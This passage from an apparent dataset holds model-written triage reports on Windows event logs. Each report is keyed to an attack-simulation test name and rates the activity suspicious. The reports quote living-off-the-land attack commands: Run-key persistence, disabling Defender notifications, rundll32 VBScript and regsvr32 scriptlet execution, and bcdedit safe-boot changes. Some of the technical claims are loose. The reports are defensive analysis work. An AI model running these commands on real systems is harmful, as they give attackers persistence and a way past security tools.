   - The `cmd.exe` process is executed by `SERVER002\admin_test`. This action requires administrative privileges, and was executed in a high integrity level context, indicative of potential misuse of administrative permissions.

4. **Time Change Events:**
   - Both the System and Security logs contain events indicating time changes, conducted by `svchost.exe` under the ""LOCAL SERVICE"" account. While time changes can be legitimate (e.g., due to time synchronization tasks), unauthorized time adjustments can be used to obscure traces of unauthorized activity.

5. **Use of System Utilities:**
   - Utilization of utilities such as `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe` by `admin_test` reflects routine system diagnostic activities. However, frequent and rapid executions could hint at reconnaissance activities often seen in lateral movement stages of a compromise.
   
6. **Software Protection Platform Service:**
   - The Software Protection Platform (SPP) entry in the Application log does not suggest any immediate malfeasance but should be noted in the context of license management and validity of Windows operating system instances.

**Assessment:**
- **Suspicious:** The specific `cmd.exe` command to modify the registry is indicative of suspicious activity. It is not normal to set restrictive policies like `NoDesktop` through scripts or command-line tools unless there is an administrative purpose behind it. The combination of changes in system time and the execution of multiple system diagnostic tools suggest a pattern that warrants further investigation for potential lateral movement or privilege misuse.

**Guidance on How to Proceed:**
1. Review the context and necessity of the registry modification. Verify if this operation was authorized or unexpected.
2. Investigate the `admin_test` user account for unusual logins or recent privilege changes. Examine the user's activity for other unauthorized actions.
3. Ensure time synchronization service configurations are correct and monitored for unauthorized changes.
4. Explore the Edge update logs to confirm if the frequency of updates aligns with legitimate updates.

Final Resolution: **SUSPICIOUS** - Logs contain a registry modification that could be part of a larger unauthorized configuration change or misuse. Further investigation is recommended to rule out malicious intent or insider threat."
Windows Modify Show Compress Color And Info Tip Registry,"After a detailed analysis of the provided event logs, here are my findings:

### Application Log Analysis
- **EdgeUpdate Events:** Multiple entries indicate the stopping of the `edgeupdate` service at similar timestamps. This could potentially be part of normal update operations or service restarts. However, without additional context, it is hard to determine if there is any malicious intent.
  
### System Log Analysis
- **Time-Service Event:** Shows the system time synchronization with an external NTP server. This is generally expected behavior in a well-configured network environment.

### Sysmon Log Analysis
- **Process Execution Observations:**
  - Various system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` are executed by the user `SERVER002\\admin_test`. These tools are standard Windows utilities, and their usage is not inherently suspicious. However, their execution in quick succession could raise a red flag for potential misuse or scripted behavior.
  - There is a `cmd.exe` process executed with a command line involving registry modifications (`reg add...`). These operations were conducted by an admin account, which could be routine but is nonetheless a change to system behavior. This might warrant further investigation, especially if unsolicited.
  - The execution of `MicrosoftEdgeUpdate.exe` and related processes appears extensively within a short timeframe. This behavior might align with legitimate update activity but could also mask malicious activities if hijacked (e.g., DLL hijacking). 

### Indicators of Potential Malicious Activity:
- **Registry Modification via Command Line:** The `cmd.exe` process alters GUI-related registry settings silently and with administrative privileges. If performed without proper authorization or knowledge, it could indicate an intrusion attempting to modify system behavior.
- **High Frequency of System Utility Execution:** While using `wevtutil.exe` and `conhost.exe` may be part of normal operation, repeated execution of these utilities, particularly by a test/temporary admin account, might represent reconnaissance or log tampering actions by an intruder.

### Final Assessment:
- **Resolution: SUSPICIOUS**

Based on the evidence, the logs hold signs of suspicious activity. The series of registry modifications, frequent system utility usage by an admin test account, and the entry of various `edgeupdate` components in rapid sequences point towards possible unusual actions that require further investigation. 

### Recommendations:
- **Investigate Registry Changes:** Confirm whether the registry modifications via `cmd.exe` were authorized or expected as part of regular IT operations or deployment activities.
- **Review Administrative Account Activity:** Examine the use and necessity of the `admin_test` account and any recent changes or ownership modifications, ensuring it aligns with standard security practices.
- **Conduct Threat Hunting:** Perform further detailed checks for potential persistence mechanisms or unauthorized changes, focusing on edge and utility applications to confirm no malicious code injection or abuse took place.
- **Assess System Integrity:** Monitor the system for new or unusual behavior in the coming days and consider employing additional endpoint detection and response (EDR) solutions for proactive threat logging and analysis.

Conclusively, while no definitive malicious activity is evident, caution and further scrutiny are warranted."
Modify Registry of Local Machine - cmd,"### Detailed Log Analysis

#### Sysmon Log Analysis
The logs provided show multiple records of events predominantly fired from the Microsoft-Windows-Sysmon channel, logging different process creation events. Here are some key observations:

1. **System Services Execution:**
   - Multiple executions of common system processes such as `svchost.exe` and `conhost.exe`. Generally, these are legitimate, but monitoring is needed to ensure they aren't being exploited.
   - `wevtutil.exe` is used occasionally to manipulate event logs which can be legitimate but worth noting if done excessively.

2. **Potentially Suspicious Activity:**
   - Use of `wevtutil.exe` under a user account (`admin_test`). While `wevtutil.exe` is legitimate, frequent use could indicate log tampering attempts if not conducted for admin or maintenance tasks. This warrants further checking on the legitimacy of `admin_test` activities.
   - Execution of `cmd.exe` with a command indicating registry manipulation:
     - `\""cmd.exe\"" /c reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f` - This command adds a registry key that could start `calc.exe` on system boot-up, suggestive of persistence mechanism installation. This is highly suspicious.

3. **Other Processes:**
   - Multiple legitimate Microsoft Edge Update operations conducted by `MicrosoftEdgeUpdate.exe`.
   - Processes like `whoami.exe` and `hostname.exe` are used occasionally, which could be part of legitimate tasks or scripts.

#### System, Application and Security Log Analysis
- **System Logs:**
  - Time synchronization activities through `svchost.exe`, which are routine.

- **Security Logs:**
  - Time change events which align with the system activities observed in System logs.

- **Application Logs:**
  - Routine service stopped events for `edgeupdate`, consistent with observed Edge update processes.

### Threat Assessment and Resolution

Based on the analysis:

- **Suspicious Activity Identified:**
  - The command line executed via `cmd.exe` to add a registry entry is highly suspicious. Altering the Run key to execute another application upon startup is a known method to establish persistence and could signify potential compromise.

- **User Activity:**
  - The activities by `SERVER002\\admin_test`, especially involving commands that manipulate the system and registry, require further investigation.

### Conclusion
The event logs showcase benign system updates and some suspicious activities which cannot be ignored, especially around registry usage, indicating potential attempts at persistence setup.

**Resolution: SUSPICIOUS**

### Recommendations for Action
1. **Immediate Action:**
   - Investigate the `admin_test` account usage to ascertain whether these activities align with standard administrative tasks.
   - Verify the origin and legitimacy of the registry entry addition for starting `calc.exe` on boot.
   - Perform a thorough security review on the host system for other potential persistence mechanisms or indicators of compromise.

2. **Long-term Actions:**
   - Regularly audit privileged accounts, particularly logging activities associated with critical tasks like registry changes.
   - Continuous monitoring of activities flagged as excessive or abnormal, refining Sysmon rules to capture similar activities for future analyses."
Indirect Command Execution - pcalua.exe,"Upon reviewing the provided Windows event logs, here are the observations and analyses for suspicious or anomalous behavior:

1. **Sysmon Logs:**
   - There is repeated usage of common Windows utility executables (`hostname.exe`, `whoami.exe`, `conhost.exe`, `cmd.exe`, `pcalua.exe`, `calc.exe`, `wevtutil.exe`, etc.). While these applications can be benign, the context and command-line arguments suggest potential scripting or automation activity.
   - `cmd.exe` is executed with command-line arguments that chain multiple commands (`pcalua.exe -a calc.exe & pcalua.exe -a C:\\Windows\\System32\\calc.exe`). This could reflect either administrator testing or potentially script-based automation or a scheme for executing multiple actions via command line.
   - The presence and execution frequency of `calc.exe` appear abnormal since multiple instances are being executed through pcalua.exe, potentially indicating testing or attempts to bypass restrictions via compatibility assistant if done by an attacker.
   - Frequent operation of `wevtutil.exe` is noted. In context, wevtutil is a Windows tool for accessing Windows event logs, and automation involving it may be part of legitimate administration but could also mean log manipulation by an adversary.
   - The processes are spawned by the `wsmprovhost.exe`, a legitimate Windows Management Instrumentation (WMI) provider host process. A significant number of elevated user processes in quick succession using high integrity levels possibly indicates a PowerShell or WMI script handling utilities in an administrative session.

2. **Command-Line Indicators:**
   - `cmd.exe` running `/c` (carry out) commands sometimes chain actions which could lead to typical responses or increased scrutiny.

3. **Time Synchronizations and Network Service Executions:**
   - `time.windows.com` time synchronization is noted, which is normal for system time maintenance.
   - Network services such as `sppsvc.exe`, `TiWorker.exe`, `TrustedInstaller.exe`, and `WmiPrvSE.exe` are normal Windows processes operating under `NT AUTHORITY\SYSTEM`.

**Assessment:** The observed behaviors, particularly with the command-line executions and the explicit launch of utility tools suggest the need for further investigation into potential misuse. Although some activity could be attributable to legitimate administrative tasks, repeated calls to administrative utilities and log access commands are noteworthy.

**Guidance:**
- **SUSPICIOUS:** This determination is due to the pattern of executing multiple system utilities, often associated with both legitimate tasks and unauthorized activities. It's recommended to:
  - Verify with the operational team if these scripts or actions are part of a scheduled task or IT operations.
  - Review user `admin_test` activities for context on these events.
  - Check for any unauthorized or scheduled tasks which might be executing these commands.
  - Ensure system integrity by confirming patches and updates are legitimate and recent event modifications do not symbolize tampered logs.

Given the information, no explicit malicious action is confirmed; however, abnormal patterns warrant further scrutiny to eliminate underlying risks."
Disable Win Defender Notification,"Upon analyzing the provided log entries, I have observed and assessed the following activities to determine if any indicators of malicious behavior or anomalies are present:

1. **System Time Change Events**:
   - Observed multiple entries of Event ID 4616, indicating a system time change. The time change activities appear within milliseconds of each other. However, these events show a rollback in system time which can sometimes be used by malicious actors for time-based anti-forensic measures.

2. **Svchost.exe Activities**:
   - svchost.exe is a critical system process that can sometimes be used by malware to hide its tracks. The activity primarily revolves around time changes and kernel-general updates, which do not inherently seem malicious without context suggesting unauthorized use or deviation from normal behavior.

3. **Cmd.exe and Reg.exe Execution**:
   - A command execution via cmd.exe: `cmd.exe /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"" /v ""DisableNotifications"" /t REG_DWORD /d 1 /f`. This command modifies the registry to disable Windows Defender notifications. This is a significant red flag, as disabling security notifications could indicate an attempt to avoid detection, suggesting potential malicious intent.

4. **Sysmon Events**:
   - Multiple executions of `wevtutil.exe` and `conhost.exe` by a user named `SERVER002\admin_test`. While not inherently malicious, these executions should be validated against expected user activity as they manage event logs.
   - The execution of `whoami.exe` and `hostname.exe` appears benign if related to user checks or troubleshooting by an admin.
   - An entry for `Microsoft Edge Update` processes seems tied to legitimate software update actions given their association with `nt authority\system` and consistent parent-child process relations.

5. **EdgeUpdate Process Logs**:
   - Microsoft Edge Update seems to be executing and updating tasks. This is consistent with typical system behavior for software updates and appears linked to **Microsoft Corporation**, suggesting benign intent under NT AUTHORITY\system.

6. **Windows PowerShell Log**:
   - No PowerShell commands or anomalies were detected from the log segments provided, so no additional insights from this vector.

7. **Security Audit Events**:
   - Time changes associated with the `LOCAL SERVICE` user identity, managed by `svchost.exe`. The intent behind alteration is unclear but suspicious enough to warrant further monitoring.

### Assessment and Conclusion:
The command via `cmd.exe` to disable Windows Defender notifications strongly suggests an attempt to possibly hide other nefarious actions or reduce security alerting, categorizing this as a **SUSPICIOUS** activity. This, combined with the time rollback events, indicates there is potential for malicious behavior, but further investigation into user activities, event trigger correctness, and potential intent is needed to confirm or escalate the actions to malicious intent.

**Resolution**: **SUSPICIOUS**

### Recommended Actions:
1. **Investigate User Activity**: Verify if user `admin_test` had any scheduled tasks or legitimate reason to disable notifications.
2. **Alert Security Team**: Monitor any further registry changes or processes launched by `admin_test` without justification.
3. **Restore System Defenses**: Re-enable Windows Defender notifications promptly and monitor for any reattempts to disable them.
4. **Timeline and Context Analysis**: Review additional logs around other system actions performed in tandem with the time change events."
Javascript in registry,"### Analysis:

Upon reviewing the provided Windows event logs from the PowerShell, Sysmon, System, Application, and Security event sources, several activities stand out as potentially suspicious or needing further investigation.

#### 1. **PowerShell Activity:**
- **Suspicious Command Execution:** 
  - A PowerShell script execution is noted with the following command: `powershell.exe & {New-ItemProperty ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" -Name data -Value ""<script>""}`. The use of PowerShell to modify registry settings with script content is unusual and can be a method used by attackers to establish persistence or modify system behavior in a malicious manner. This particular command attempts to inject a script tag into the registry, which is atypical and suspicious.

#### 2. **Sysmon Activity:**
- **Frequent Process Execution:**
  - Several instances of Sysmon logs indicate the execution of processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` by the user `SERVER002\admin_test`. While these utilities are legitimate Windows components, their execution in rapid succession, especially by an administrative user, can indicate script-based activity or attempted reconnaissance often seen in malicious activity. Further scrutiny is warranted to understand the context and necessity of these operations.

#### 3. **System Log Anomalies:**
- **Time Modification Events:**
  - There are security events (4616) indicating changes to the system time, which can be a tactic employed to evade detection by manipulating timestamps of event logs or installed files.
  
#### 4. **Security and Privilege Logs:**
- **Multiple Logon Events and Privilege Use:**
  - There are several logon events (4624) and privilege elevation events (4672) recorded for the user `admin_test`. The presence of multiple privileged actions like `SeDebugPrivilege` and others is highly sensitive. This could represent legitimate administrative activity, but if combined with other suspicious behaviors, it might be part of a lateral movement or privilege escalation strategy.

#### 5. **Edge Update Activity:**
- **Regularity and Contextuality:**
  - The logs indicate several activities around `MicrosoftEdgeUpdate.exe`, which are typically benign since they are related to updating Microsoft Edge components. However, given the context alongside the suspicious PowerShell execution, it is important to verify if these updates are legitimate.

### Assessment:

- **Suspicious Indicators:** The PowerShell command that modifies the registry with potentially malicious content is a critical indicator of suspicious behavior. Coupled with the frequent use of system utilities and the potential manipulation of system time, these logs indicate unusual activity that needs further analysis.
  
- **User Activity:** The admin user `SERVER002\admin_test` shows multiple elevated operations that, if unauthorized, could represent a misuse of privileges.

### Recommendation and Conclusion:

- **Resolution:** **SUSPICIOUS** - The logs demonstrate activities that don't look right and warrant further investigation. While there are no definitive signs of malware execution, the PowerShell activities and system modifications require a thorough review to rule out potential compromise.
  
- **Immediate Actions:**
  1. Review the context and intent of the PowerShell command execution with `<script>` value.
  2. Verify the legitimacy of system time changes and investigate if they were authorized.
  3. Cross-reference recent `admin_test` user activities and verify against authorized administrative actions.
  4. Conduct an integrity check on the processes and directories involved, especially around Edge updates, to ensure no tampered binaries.

By conducting these steps, any potential compromises can be triaged effectively, protecting the system from harm."
Rundll32 execute VBscript command using Ordinal number,"Upon review of the provided logs, there are several points of interest:

1. **Microsoft Edge Update Activity**:
   - There are multiple logs related to Microsoft Edge Update processes such as `MicrosoftEdgeUpdate.exe` and its installer components. Most instances seem benign as they match expected behavior for updates and installations (`/update`, `/regserver`, etc.). However, it's worth noting that some files are located in temporary directories which might be unconventional for a production environment, though not necessarily malicious.

2. **Unusual Execution of `cmd.exe`**:
   - There is a specific `cmd.exe` process executed with a peculiar command:
     ```
     ""cmd.exe"" /c rundll32 vbscript:""\\..\\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)
     ```
     - This uses `rundll32` and `vbscript` to execute `calc.exe`. Such patterns are known techniques used in exploitation scenarios, primarily for code execution (test payload). While `calc.exe` itself is benign, the method of execution can indicate a proof-of-concept or potential attack attempt.
   
3. **Logon and Privilege Escalation Activities**:
   - Several log entries record `admin_test` logging in and being granted high-level privileges such as `SeDebugPrivilege`. While this can occur normally, especially for administrative scripts or updates, combined with other suspicious behaviors (like the `cmd.exe` execution), it warrants further investigation.

4. **Potential Time Manipulation**:
   - Logs indicate changes in system time (`EventID 4616` in the Security log). Altering system time can be indicative of an attempt to manipulate logs or time-dependent security measures. However, there is not enough information in the logs to confirm malicious intent here.

In conclusion, the presence of `cmd.exe` executed in conjunction with `rundll32` and `vbscript` to launch `calc.exe`, combined with high-level privilege grants, suggests suspicious activities that warrant further investigation.

**Final Resolution**: **SUSPICIOUS**

**Recommendations**:
- Investigate the origin and intent of the `cmd.exe` execution with `rundll32` and `vbscript`.
- Review the access logs and scripts executed by `admin_test` to ensure there is no misuse of privileges.
- Confirm whether the Edge update activities are in alignment with expected update schedules and paths.
- Monitor for additional suspicious behavior and strengthen monitoring around critical privileges like `SeDebugPrivilege`."
Invoke HTML Application - Jscript Engine Simulating Double Click,"Based on a detailed examination of the provided logs from the Windows host, the following findings and assessments can be made:

1. **PowerShell Activity**: There is a notable PowerShell activity where the command execution involves `Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick`. This command is especially suspicious because it seems like an attempt to execute an HTA (HTML Application) file using JScript. HTA files are frequently used in phishing attacks due to their ability to execute scripts, and the simulated user interaction suggests potentially malicious automation.

2. **Wevtutil.exe Usage**: The usage of `wevtutil.exe` is logged multiple times. This utility is generally used for querying and backing up event logs. While legitimate in system administration, repeated and clustered execution could imply attempts to manipulate or clear event logs, which is a common tactic employed by attackers to cover their traces.

3. **UsoClient.exe and Process Integrity**: `UsoClient.exe` is related to Windows Update operations. Although it shows high integrity level execution, which is typical for system operations, its conjunction with the preceding PowerShell activity might suggest an attacker trying to leverage legitimate processes for malicious purposes.

4. **System and Application Logs**: The system and application logs do not directly exhibit malicious activities, such as failed logins or unauthorized software installations. However, the presence of multiple Windows Update events suggests typical background activity rather than any indicators of compromise.

5. **Behavior Context**: The observed behavior falls into the grey area, lacking a clear context of why `admin_test` was executing numerous system utilities during this timeframe. The logs do not independently confirm malicious intent but suggest unusual usage patterns that deviate from normal system operations.

**Assessment and Recommendation**:
- **Resolution**: The events indicate **SUSPICIOUS** activity. The usage of PowerShell for executing a script with potential harmful implications and the multi-invocation of native Windows utilities in a condensed timeframe warrant further investigation.
  
- **Next Steps**: 
  - Conduct a more in-depth forensic analysis on the server to check for additional indicators, focusing on file integrity, registry changes, and network traffic during the period.
  - Review user `admin_test` actions and validate if these activities were part of scheduled tasks or routines that could explain the behavior.
  - Consider a threat hunt focused on detecting the presence of other known post-exploitation frameworks, as the activity suggests possible script-based attacks or penetration testing activity.
  
- **Preventive Measures**: Implement enhanced monitoring for PowerShell script execution with specific attention to scripting that involves known Lateral Movement or Execution tactics (e.g., HTA-based methods)."
Activate Windows NoClose Group Policy Feature,"**Analysis of the Logs:**

1. **Time Manipulation:**
   - In the Security and System logs, there are Event ID 4616 entries indicating changes in the system time by the process ""svchost.exe"". This could be an indication of time being tampered with, which is a known tactic used to cover tracks in a breach. Although `svchost.exe` is a legitimate Windows service host process, time manipulation without a valid justification can be suspicious.

2. **Command Execution:**
   - The Sysmon log contains an Event 1 entry where `cmd.exe` is executed with a command to modify the Windows Registry: `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoClose /t REG_DWORD /d 1 /f`. This command attempts to modify the user's registry settings to disable the Close option in Windows Explorer. This can be used as a persistence mechanism or to interfere with user actions, which indicates suspicious behavior.

3. **Process Hierarchy:**
   - Several Sysmon events show processes like `wevtutil.exe` and `conhost.exe` running under `SERVER002\admin_test`. While the processes themselves aren't inherently malicious, wevtutil can be used for log manipulation, and frequent instances of these processes are unusual under admin accounts unless there is a known administrative or debugging session happening, which raises suspicion.

4. **Software Updates:**
   - There are several entries related to Microsoft Edge Update processes. These are seen in both the Application log (`edgeupdate` service stopped) and Sysmon logs. It's common for software updates to rapidly spawn multiple processes, particularly when upgrading components. However, these include the use of temporary and executable files from unusual directories (`C:\Program Files (x86)\Microsoft\Temp...`) which can, in some cases, be leveraged for lateral movement or execution of extra payloads if not updated in a controlled manner.

**Assessment and Resolution:**

- **Suspicious Activity:**
  - The time manipulations and registry changes, combined with the rapid spawning of utility and update processes from uncommon locations, are considered suspicious as they could be associated with shadowy operations or configurations being changed by unauthorized users or scripts.

- **Recommendation:**
  - **Further Investigation Required:**
    - Verify if the time changes had legitimate reasons (e.g., updates, maintenance).
    - Check if the registry modifications were part of an administrative action or software’s legitimate requirement.
    - Investigate the `SERVER002\admin_test` user activity and ensure that the user account was not compromised.
    - Review the update mechanism for Microsoft Edge to ensure the integrity of files involved and see if any other unauthorized changes occurred alongside these updates.

Resolution: **SUSPICIOUS** - Even though the activity is not decidedly malicious, it requires deeper investigation to rule out any compromise or unauthorized changes."
Regsvr32 local COM scriptlet execution,"Upon review of the Windows event logs provided, the following key observations can be noted:

### Observations:

1. **Repeated Execution of System Utilities:**
   - There are frequent executions of standard Windows utilities such as `powershell.exe`, `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`. 
   - Many of these executions involve administrative resources (`SERVER002\\admin_test`), which seems to be performing system tasks. It is not uncommon for administrators to execute commands for maintenance or monitoring purposes.

2. **Suspicious Command with `cmd.exe`:**
   - Notably, there's an execution of `cmd.exe` with a specific command:  
     ```cmd
     ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /u /i:""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.010\src\RegSvr32.sct"" scrobj.dll
     ```
   - This command uses `regsvr32.exe` with script execution functionalities (`/u /i`) involving a `.sct` file. This is a known tactic used for fileless malware attacks and script-based attacks to bypass security controls by leveraging signed Windows binaries.

3. **Presence of System Updates and Logs:**
   - Microsoft Edge Update related processes and logs are present, indicating the system is being updated which aligns with routine, expected activity on a managed server.

4. **Security Measures:**
   - Windows Defender is reported as being active, with status logs indicating it is turned on, which suggests some level of active defense against threats.

### Assessment:

- **Suspicious Activity:**
  - The command involving `regsvr32.exe` and script execution through an `.sct` file is highly indicative of potentially malicious activity. This technique is a hallmark of attackers attempting to use living-off-the-land binaries (LOLBins) to perform stealthy operations or to trigger payloads without dropping traditional executables on disk.

- **Benign vs. Malicious:**
  - While some described activities (such as utility executions and Edge updates) are consistent with benign administrative and update tasks, the use of `regsvr32.exe` for script execution remains a red flag requiring immediate attention.

### Recommendation:

- **Resolution: SUSPICIOUS**
  - **Investigate Further:** This activity should not be ignored. It is crucial to conduct a deeper examination of the source and purpose of the script being executed by `regsvr32.exe`.
  - **Forensic Analysis:** Examine the contents and origin of the `RegSvr32.sct` file mentioned in the command line identified and verify its legitimacy. Assess user activity associated with `SERVER002\\admin_test` to determine if these actions were authorized or part of expected operations.
  - **Review Endpoint Detection Solutions:** Confirm that the endpoint detection and response solutions like Windows Defender are configured correctly and up-to-date for such threat detection.
  - **Strengthen Security Posture:** Consider implementing controls that restrict the use of potentially risky commands and utilities by scrutinizing command-line arguments and monitoring script activities for unauthorized or suspicious behaviors.

Further investigation into current and historical logs, coupled with validation of any activities between this server and external entities, will provide a clearer understanding of any potential threats or abuse occurring on Server002."
Command Execution with NirCmd,"Upon reviewing the provided logs, there are several key points of interest that may indicate suspicious activity:

### Indicators of Potential Malicious Activity

1. **Privilege Escalation and Administrative Activities:**
   - **Event IDs 4672 and 4624**: There are multiple occurrences of these events linked to the `SYSTEM` account on the `Server002` machine. The privileges listed (SeDebugPrivilege, SeSecurityPrivilege, and others) provide extensive rights, but seeing these events alone isn't necessarily alarming if they align with legitimate tasks. However, they warrant attention due to their potential misuse.
   
2. **Credential Access Attempts:**
   - **Event ID 5379**: Multiple events indicating attempts to access Microsoft account credentials (`MicrosoftAccount:user=02txoixylodcstop`), which consistently return a failure code (3221226021). Persistent failed attempts can indicate credential harvesting.

3. **Suspicious PowerShell Activity:**
   - **PowerShell Log Entries** include execution of a script with a `nircmd.exe` executable to hide UI elements such as the system clock (`Shell_TrayWnd` and `TrayClockWClass`). This could suggest obfuscation to hide suspicious activity from the user, indicating potential malicious actions.

4. **Unusual Process Activity in Sysmon Logs:**
   - Multiple executions of utilities `wevtutil.exe` and `conhost.exe` with the admin_test user could imply event log manipulation or commandline interactions to cover tracks or execute malicious commands.
   - Execution of binaries like `nircmd.exe` under the admin_test profile with elevated privileges can indicate administrative tampering for potential stealth activities.

### Conclusion and Recommendations

Based on this analysis, the logs exhibit several red flags that suggest suspicious and potentially malicious activity:

- **SUSPICIOUS**: These logs reveal activities that align with tactics often used by malware or unauthorized actors (e.g., privilege escalation, administrative task automation, and credential access attempts). While there isn’t definitive evidence of compromise, the alignment with common malicious objectives suggests the need for further investigation.

### Recommended Actions:

1. **User Activity Review**: Monitor and investigate the activities of the user accounts, especially `admin_test`, associated with the suspicious PowerShell and Sysmon events to confirm if those were legitimate activities.

2. **Credential Monitoring**: Investigate the repeated failed credential access attempts (Event ID 5379) to ascertain the reason and source of these attempts.

3. **PowerShell Script Analysis**: Review the execution of the PowerShell script that involves `nircmd.exe` to understand its intent and potentially prevent unauthorized visibility manipulations.

4. **Log Integrity and Coverage**: Ensure there are no signs of log file tampering (wevtutil usage), and establish comprehensive monitoring to detect further unauthorized actions. 

5. **Increase Operational Security Measures**: Consider strengthening user authentication and monitoring, potentially deploying multi-factor authentication (MFA), and reviewing privilege access management.

Further in-depth forensic analysis and potentially engaging incident response (IR) processes may be warranted to fully assess and secure the environment."
DiskShadow Command Execution,"### Detailed Analysis of Logs

#### Observations:
1. **Process Creation with PowerShell**:
    - A PowerShell process (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) was executed with a command involving `diskshadow.exe` from a temporary file path (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data.txt`). This is typically unusual in general environments as `diskshadow.exe` is not commonly used legitimate tasks, especially when run via PowerShell from a temporary directory.
    - The integrity level of the process was marked as ""High"", indicating it had elevated or administrative privileges.

2. **Multiple Instances of `wevtutil.exe` and `conhost.exe`**:
    - There are multiple instances of `conhost.exe` and `wevtutil.exe` being spawned with the same admin user account, `SERVER002\\admin_test`. The `wevtutil.exe` command is commonly used to manage Event logs, and can potentially indicate log manipulation attempts.

3. **Legitimate Microsoft Edge Updates**:
    - There are several entries indicating regular Microsoft Edge updates executed by `MicrosoftEdgeUpdate.exe`, which appears to be running under the `NT AUTHORITY\\SYSTEM` context. The processes are part of the standard software update tasks from Microsoft and appear consistent with benign updates.

4. **System and Security logs**:
    - The system and security logs are not provided or do not contain entries of interest in this dataset, limiting the context around specific actions.
    
5. **Application Logs**:
    - Indicates a typical `Service stopped` message likely related to the Edge updates, seems legitimate.
    
6. **Windows PowerShell Logs**:
    - Indicate PowerShell sessions starting and stopping, correlating with the suspicious PowerShell disk shadow events.

#### Assessment of the Situation:
- The use of `PowerShell` to execute `diskshadow.exe` from a temporary path raises a red flag, as it is an uncommon utility for regular users and could be used to create shadow copies of data by malicious actors for data exfiltration or persistence techniques.
- Concurrent execution of `wevtutil.exe` could imply attempts to tamper with event logs to cover tracks.
- However, apart from these activities, most of the logs indicate regular system processes and updates.

#### Threats or Risks Identified:
- Potential unauthorized access or script execution using `PowerShell` with elevated privileges.
- Possible alteration of event logs via `wevtutil.exe`.

#### Guidance on How to Proceed:
- Investigate the `diskshadow.exe` activity in detail by examining the contents and purpose of `data.txt` located in the temporary directory.
- Review the Parent Process of the PowerShell and the context in which these command lines were executed.
- Cross-reference these logs with network logs to identify any unusual outbound actions.
- Consider implementing a stricter PowerShell execution policy and monitoring for activities involving `diskshadow.exe`.
- Ensure centralized logging to an offsite location to prevent log manipulation.

### Resolution:
Based on the analysis, the resolution is: **SUSPICIOUS** 

The behavior observed suggests potential misuse of legitimate utilities, and further investigation is warranted to confirm or dismiss any malicious intent."
Rundll32 advpack.dll Execution,"Upon review and analysis of the provided Windows event logs, I have noted several key observations:

### Observations:

1. **PowerShell Execution**: A PowerShell process (`powershell.exe`) was executed by the user `SERVER002\admin_test`. PowerShell is a legitimate tool but can be used for malicious purposes, especially if launched with unusual or obfuscated command-line arguments. However, the logs provided do not include command-line arguments used in the execution, which restricts identifying any intent.

2. **Use of `wevtutil.exe`**: This utility is legitimate and used for managing Windows event logs. `wevtutil.exe` was executed multiple times by `SERVER002\admin_test`. While not inherently malicious, frequent use could indicate log clearing or manipulation attempts depending on context. The context here lacks clear indicators of malicious intent.

3. **Unusual `cmd.exe` Command**: An instance of `cmd.exe` was executed with the command `""cmd.exe"" /c rundll32.exe advpack.dll,LaunchINFSection ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.011\\src\\data.011.inf"",DefaultInstall_SingleUser,1,`. This pattern can be indicative of potentially harmful activities or script execution. Specifically, the use of `rundll32.exe` could be employed to invoke malicious DLLs or scripts.

4. **`rundll32.exe` Invocation**: The command `rundll32.exe advpack.dll,LaunchINFSection` was used, which is a valid function call for installing sections within INF files. However, invoking this from a temporary directory raises some concern about the legitimacy of the file being executed.

5. **Use of MicrosoftEdgeUpdate.exe**: The logs demonstrate routine activity related to the Microsoft Edge Update process. There is no indication of tampering within these updates.

6. **Security Logs and Privilege Escalation**: A log entry for event ID 4672 indicates special privileges were assigned to the account `SYSTEM`. This is a common event when system services start and may not be uncommon.

### Conclusion:

While there are some potentially suspicious activities, such as the PowerShell execution and use of `rundll32.exe` from the temp directory, there isn't enough evidence in the provided logs to definitively label these activities as malicious. Common administrative tasks could produce similar logs.

### Recommendation:

To conclude, the current assessment of the logs is **SUSPICIOUS**, necessitating further investigation:

- **Analyze PowerShell Scripts**: If possible, obtain command-line arguments or script contents related to the PowerShell executions to determine intent.
  
- **Investigate `rundll32.exe` Activity**: Validate the legitimacy of the file `data.011.inf` from which `rundll32.exe` was invoked. It's essential to check if this activity aligns with scheduled tasks or user actions.

- **Advanced Monitoring**: Implement stricter logging and alerting on the usage of PowerShell and execution of scripts within temporary directories to ensure immediate detection and response to potential threats.

- **Conduct a Comprehensive Audit**: Further investigate the user's activity (`SERVER002\admin_test`) during this period to ensure no misuse of credentials or unauthorized actions occurred.

By following these steps, we can gain a clearer understanding of whether these activities form part of a legitimate process or if they signify a security risk that requires mitigation."
Safe Mode Boot,"In reviewing the provided Windows event logs, specifically focusing on Sysmon logs for indications of suspicious or malicious activities, several observations arise.

### Detailed Analysis:

1. **Unusual Process Execution Patterns**:
   - There is a recurring execution of `wevtutil.exe` by the user `SERVER002\admin_test`. While `wevtutil.exe` is a legitimate Windows utility used to manage and query event logs, its frequent use, particularly in a series of rapid executions, can sometimes indicate an attempt to tamper with or delete event log entries to cover tracks.
   - We also observe the repeated execution of `conhost.exe`, which is the Console Window Host. While it launches when a command prompt or certain console-based applications run, the pattern here suggests it mirrors the `wevtutil.exe` activity - serving possibly as a parent process.

2. **Security-Related Commands**:
   - `cmd.exe` is used with the command line `""/c bcdedit /set safeboot network""`. This command is setting the system to boot into Safe Mode with Networking. Changing boot configurations in such a manner can be part of a malicious strategy to gain control over the system or prepare it for malicious activities during reboot.

3. **User Context and Execution Integrity**:
